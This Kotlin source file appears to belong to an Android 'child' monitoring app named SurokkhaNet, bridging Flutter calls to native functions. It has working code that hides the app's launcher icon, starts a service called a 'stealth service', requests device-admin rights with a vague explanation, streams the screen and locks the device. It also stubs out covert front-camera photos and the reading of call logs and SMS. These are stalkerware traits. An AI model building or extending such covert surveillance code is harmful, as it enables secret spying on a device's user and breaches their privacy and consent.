package com.surokkhanet.child

import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.provider.Settings
import androidx.core.content.ContextCompat
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel

class NativeBridge(private val context: Context, private val activity: Activity) {

    private val channel = "com.surokkhanet/native"

    fun configure(flutterEngine: FlutterEngine) {
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, channel).setMethodCallHandler { call, result ->
            try {
                when (call.method) {
                    "activateDeviceAdmin" -> activateDeviceAdmin(result)
                    "openAccessibilitySettings" -> openAccessibilitySettings(result)
                    "hideAppIcon" -> hideAppIcon(result)
                    "startStealthService" -> startBackgroundService(result)
                    "captureScreen" -> captureScreen(result)
                    "startScreenStream" -> startScreenStream(result)
                    "lockDevice" -> lockDevice(result)
                    "takeFrontPhoto" -> takeFrontPhoto(result)
                    "getCallLogs" -> getCallLogs(result)
                    "getSms" -> getSms(result)
                    "triggerUninstall" -> triggerUninstall(result)
                    else -> result.notImplemented()
                }
            } catch (e: Exception) {
                result.error("ERROR", e.message, null)
            }
        }
    }

    private fun activateDeviceAdmin(result: MethodChannel.Result) {
        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
            putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, 
                ComponentName(context, DeviceAdminReceiver::class.java))
            putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, 
                "Required for security features")
        }
        activity.startActivityForResult(intent, 100)
        result.success(true)
    }

    private fun openAccessibilitySettings(result: MethodChannel.Result) {
        val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        }
        context.startActivity(intent)
        result.success(true)
    }

    private fun hideAppIcon(result: MethodChannel.Result) {
        val componentName = ComponentName(context, "com.surokkhanet.child.MainActivity")
        context.packageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
        result.success(true)
    }

    private fun startBackgroundService(result: MethodChannel.Result) {
        val intent = Intent(context, BackgroundService::class.java)
        ContextCompat.startForegroundService(context, intent)
        result.success(true)
    }

    private fun startScreenStream(result: MethodChannel.Result) {
        val projectionManager = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        val intent = projectionManager.createScreenCaptureIntent()
        activity.startActivityForResult(intent, 101)
        result.success(true)
    }

    private fun lockDevice(result: MethodChannel.Result) {
        if (DeviceAdminReceiver.isAdminActive(context)) {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            dpm.lockNow()
            result.success(true)
        } else {
            result.error("ADMIN_REQUIRED", "Device admin not activated", null)
        }
    }

    // Placeholder methods - implement actual functionality
    private fun takeFrontPhoto(result: MethodChannel.Result) {
        result.success("photo_path.jpg")
    }

    private fun getCallLogs(result: MethodChannel.Result) {
        result.success(emptyList<Map<String, Any>>())
    }

    private fun getSms(result: MethodChannel.Result) {
        result.success(emptyList<Map<String, Any>>())
    }

    private fun triggerUninstall(result: MethodChannel.Result) {
        result.success(true)
    }
}